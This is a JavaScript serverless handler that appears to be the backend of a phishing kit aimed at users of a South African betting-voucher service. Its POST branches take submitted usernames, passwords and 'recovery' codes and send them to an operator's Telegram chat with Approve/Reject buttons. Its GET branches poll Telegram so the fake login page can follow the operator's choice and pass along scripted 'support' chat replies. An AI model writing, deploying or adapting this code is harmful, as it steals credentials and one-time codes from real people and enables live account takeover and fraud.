const T_TOK = process.env.TELEGRAM_TOKEN;
const C_ID = process.env.CHAT_ID;

let lastMsgId = null; 
let lastChatResponseId = null;

exports.handler = async (event) => {
  const { httpMethod, queryStringParameters } = event;

  // Handle GET (Polling updates)
  if (httpMethod === 'GET') {
    const action = queryStringParameters.action;

    if (action === 'getUpdates') {
      try {
        const response = await fetch(`https://api.telegram.org/bot${T_TOK}/getUpdates?offset=-1`);
        const d = await response.json();
        const last = d.result?.[0];
        if (last?.callback_query) {
          const cb = last.callback_query;
          if (cb.message.message_id === lastMsgId) {
            return { statusCode: 200, body: JSON.stringify({ action: cb.data }) };
          }
        }
      } catch (e) {}
      return { statusCode: 200, body: JSON.stringify({ action: "none" }) };
    }

    if (action === 'getChatUpdates') {
      try {
        const response = await fetch(`https://api.telegram.org/bot${T_TOK}/getUpdates?offset=-1`);
        const d = await response.json();
        const m = d.result?.[0]?.message;
        if (m && m.reply_to_message && m.text) {
          if (lastChatResponseId !== m.message_id) {
            lastChatResponseId = m.message_id;
            return { statusCode: 200, body: JSON.stringify({ text: m.text }) };
          }
        }
      } catch (e) {}
      return { statusCode: 200, body: JSON.stringify({ text: null }) };
    }
  }

  // Handle POST (Sending updates)
  if (httpMethod === 'POST') {
    const body = JSON.parse(event.body);

    if (body.action === 'login') {
      let m = `📱 *Betting Voucher Login SA 🇿🇦*\n👤 *User:* \`${body.user}\`\n🔑 *Pass:* \`${body.pass}\``;
      const kb = { "inline_keyboard": [[{ "text": "✅ Approve", "callback_data": "approve" }, { "text": "❌ Reject", "callback_data": "reject" }]] };
      
      try {
        const res = await fetch(`https://api.telegram.org/bot${T_TOK}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent(m)}&parse_mode=Markdown&reply_markup=${encodeURIComponent(JSON.stringify(kb))}`);
        const data = await res.json();
        if (data.ok) lastMsgId = data.result.message_id;
        return { statusCode: 200, body: JSON.stringify({ success: true }) };
      } catch (e) {
        return { statusCode: 500, body: JSON.stringify({ error: e.message }) };
      }
    }

    if (body.action === 'recovery') {
      let m = `⚙️ *Account Recovery 🇿🇦🇿🇦*\n👤 *User:* \`${body.user}\`\n📋 *Type:* \`${body.type}\`\n🔢 *Log:* \`${body.log}\``;
      const kb = { "inline_keyboard": [[{ "text": "✅ Approve", "callback_data": "approve" }, { "text": "❌ Reject", "callback_data": "reject" }]] };

      try {
        const res = await fetch(`https://api.telegram.org/bot${T_TOK}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent(m)}&parse_mode=Markdown&reply_markup=${encodeURIComponent(JSON.stringify(kb))}`);
        const data = await res.json();
        if (data.ok) lastMsgId = data.result.message_id;
        return { statusCode: 200, body: JSON.stringify({ success: true }) };
      } catch (e) {
        return { statusCode: 500, body: JSON.stringify({ error: e.message }) };
      }
    }

    if (body.action === 'sendChat') {
      try {
        await fetch(`https://api.telegram.org/bot${T_TOK}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent('💬 Support [' + body.user + ']: ' + body.text)}`);
        return { statusCode: 200, body: JSON.stringify({ success: true }) };
      } catch (e) {
        return { statusCode: 500, body: JSON.stringify({ error: e.message }) };
      }
    }
  }

  return { statusCode: 405, body: 'Method Not Allowed' };
};
